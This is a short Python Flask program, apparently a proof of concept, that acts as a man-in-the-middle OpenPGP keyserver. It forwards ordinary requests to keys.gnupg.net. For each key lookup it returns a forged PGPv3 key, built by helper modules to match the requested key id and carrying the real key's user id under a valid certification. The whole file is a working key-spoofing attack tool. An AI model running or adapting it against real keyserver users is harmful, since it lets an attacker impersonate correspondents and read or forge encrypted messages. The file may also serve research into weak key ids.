"""Keyserver in the middle.

Responds to any key request with a spoofed PGPv3 key, with a valid PGPv4
positive certification over it.

See README.md for details.
"""
from __future__ import division, print_function

from flask import Flask, request
from pgpdump import dumpbuffer
from requests_futures.sessions import FuturesSession

from deadbeef import deadbeef
from remunge import remunge

app = Flask(__name__)
app.config['SERVER_NAME'] = '127.0.0.1:11371'
app.debug = False

session = FuturesSession()


@app.route("/pks/<star>")
def main(star):
    """Proxy keyserver requests.

    All requests other than get ops are transparently forwarded.
    """
    future = session.get(request.url.replace('127.0.0.1', 'keys.gnupg.net'))
    if request.args['op'] != 'get' or request.args['options'] != 'mr':
        response = future.result()
        return response.content
    search = request.args['search']

    # If we know the 64-bit key id, don't wait for the server's response
    # to start computing the spoofed key.
    if len(search) >= 18:
        length = (len(search) - 2) * 4
        rsa_priv = deadbeef(int(search, base=16), length=length)
    else:
        rsa_priv = None

    response = future.result()
    pub_key = dumpbuffer(response.content)
    if rsa_priv is None:
        rsa_priv = deadbeef(int(pub_key[0].key_id, base=16), length=64)

    return remunge(rsa_priv, pub_key[1].user)


if __name__ == "__main__":
    app.run()
